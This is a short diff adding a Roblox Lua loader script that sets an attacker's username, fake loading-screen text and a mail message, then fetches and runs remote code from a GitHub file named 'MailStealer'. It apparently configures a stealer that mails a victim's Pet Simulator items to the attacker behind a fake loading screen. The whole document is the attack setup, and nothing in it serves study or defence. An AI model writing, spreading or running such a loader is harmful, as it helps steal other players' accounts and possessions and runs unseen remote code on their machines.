@@ -1,0 +1,5 @@
+User = "YOUR USER ROBLOX"
+G_ScreenLoading = "YOUR TEXT LOADING"
+G_MessageMail = "YOUR MESSAGE MAIL"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevKopers/PetSim/main/MailStealer"))()
